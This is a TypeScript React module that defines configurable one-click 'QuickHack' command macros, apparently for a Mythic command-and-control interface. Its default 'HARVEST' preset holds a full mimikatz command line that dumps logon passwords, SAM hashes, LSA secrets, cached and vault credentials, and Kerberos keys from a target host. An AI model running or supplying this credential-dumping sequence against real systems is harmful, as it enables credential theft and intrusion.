import { useMemo } from 'react';
import { useGetMythicSetting } from '../components/MythicSavedUserSetting';

export interface QuickHackVariable {
    key: string;          // placeholder name used in params, e.g. "TARGET_IP"
    type: 'ip' | 'number';
}

export interface QuickHackStep {
    command: string;    // Mythic command name
    params: string;     // command params — use {{KEY}} to reference variables
}

export interface QuickHackDef {
    id: string;
    name: string;
    description: string;
    icon: string;       // lucide icon name (e.g. "Zap", "Shield")
    color: string;      // accent color hex
    command: string;    // legacy single command (kept for backward compat)
    params: string;     // legacy single params
    steps: QuickHackStep[];  // ordered list of commands to execute
    variables?: QuickHackVariable[];
}

/** Get the effective steps for a QuickHack (migrates legacy single command/params) */
export function getHackSteps(hack: QuickHackDef): QuickHackStep[] {
    if (hack.steps && hack.steps.length > 0) return hack.steps;
    // Legacy fallback: single command/params → one step
    if (hack.command) return [{ command: hack.command, params: hack.params }];
    return [];
}

/** Parse params string to detect {{KEY}} placeholders and match them to defined variables */
export function resolveParams(params: string, variables: QuickHackVariable[], values: Record<string, string>): string {
    let resolved = params;
    for (const v of variables) {
        resolved = resolved.replaceAll(`{{${v.key}}}`, values[v.key] ?? '');
    }
    return resolved;
}

/** Check if a QuickHack requires user input before execution */
export function hackNeedsInput(hack: QuickHackDef): boolean {
    return Array.isArray(hack.variables) && hack.variables.length > 0;
}

/** Extract all IP addresses from a callback ip field (may be JSON array or plain string) */
export function extractAllIPs(ip: any): string[] {
    if (!ip) return [];
    let candidates: string[] = [];
    if (typeof ip === 'string') {
        const trimmed = ip.trim();
        if (trimmed.startsWith('[')) {
            try { candidates = JSON.parse(trimmed); } catch { candidates = [trimmed]; }
        } else {
            candidates = [trimmed];
        }
    } else if (Array.isArray(ip)) {
        candidates = ip.map(String);
    } else {
        return [String(ip)];
    }
    return candidates.map(c => c.trim()).filter(Boolean);
}

export const DEFAULT_QUICKHACKS: QuickHackDef[] = [
    {
        id: 'harvest',
        name: 'HARVEST',
        description: 'Extract credentials, tokens, cached secrets & encryption keys from target memory',
        icon: 'Zap',
        color: '#ff003c',
        command: 'mimikatz',
        params: '"privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "sekurlsa::ekeys" exit',
        steps: [
            { command: 'mimikatz', params: '"privilege::debug" "sekurlsa::logonpasswords" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "vault::cred /patch" "sekurlsa::ekeys" exit' },
        ],
        variables: [],
    },
];

export const QUICKHACK_SETTING_KEY = 'minerva_quickhacks';

export function useQuickHacks(): QuickHackDef[] {
    const stored = useGetMythicSetting({
        setting_name: QUICKHACK_SETTING_KEY,
        default_value: DEFAULT_QUICKHACKS,
    });
    return useMemo(() => {
        if (!Array.isArray(stored) || stored.length === 0) return DEFAULT_QUICKHACKS;
        // Migrate old format: strip ramCost, ensure variables array exists, convert emoji icons to lucide names
        return (stored as any[]).map(h => {
            // Migrate: ensure steps array exists
            const steps: QuickHackStep[] = Array.isArray(h.steps) && h.steps.length > 0
                ? h.steps
                : h.command ? [{ command: h.command, params: h.params ?? '' }] : [];
            return {
                ...h,
                // If icon is not a known lucide name (i.e. it's an old emoji), default to 'Zap'
                icon: typeof h.icon === 'string' && /^[A-Z][a-zA-Z]+$/.test(h.icon) ? h.icon : 'Zap',
                steps,
                // Keep legacy fields in sync with first step
                command: steps[0]?.command ?? '',
                params: steps[0]?.params ?? '',
                variables: Array.isArray(h.variables)
                    ? h.variables.map((v: any) => ({
                        ...v,
                        type: v.type === 'port' ? 'number' : v.type,
                    }))
                    : [],
            };
        }) as QuickHackDef[];
    }, [stored]);
}
